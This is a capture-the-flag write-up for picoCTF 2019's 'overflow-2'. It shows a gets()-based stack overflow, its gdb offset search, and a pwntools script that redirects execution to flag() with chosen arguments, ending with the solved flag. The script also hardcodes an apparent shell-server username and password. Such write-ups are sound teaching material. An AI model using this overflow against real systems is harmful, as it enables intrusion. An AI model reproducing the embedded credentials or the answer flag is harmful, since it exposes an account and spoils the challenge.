# Problem
Now try overwriting arguments. Can you get the flag from this [program](https://2019shell1.picoctf.com/static/53dddc4f6c42d3bdf9b6393164fdac80/vuln)? You can find it in /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc on the shell server. [Source](https://2019shell1.picoctf.com/static/53dddc4f6c42d3bdf9b6393164fdac80/vuln.c).

## Hints:

GDB can print the stack after you send arguments

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/53dddc4f6c42d3bdf9b6393164fdac80/vuln
wget https://2019shell1.picoctf.com/static/53dddc4f6c42d3bdf9b6393164fdac80/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

What we need to do here is to call ```flag(0xDEADBEEF, 0xC0DED00D)``` from ```vuln()``` somehow.

The call to ```gets()``` in ```vuln()``` is unsafe, there is no limit checking, so we can use a buffer overflow in order to do so.

We can override the return address and jump to ```flag```.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x6c6c6c6c in ?? ()
```

We know that ```llll``` overrides the return address.

Now lets write a simple python script:
```python
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('string:')
p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkk' + p32(binary.symbols['flag']) + 'XXXX' + p32(0xDEADBEEF) + p32(0xC0DED00D))
print p.recvall()
```

Flag: picoCTF{arg5_and_r3turn5e919413c}
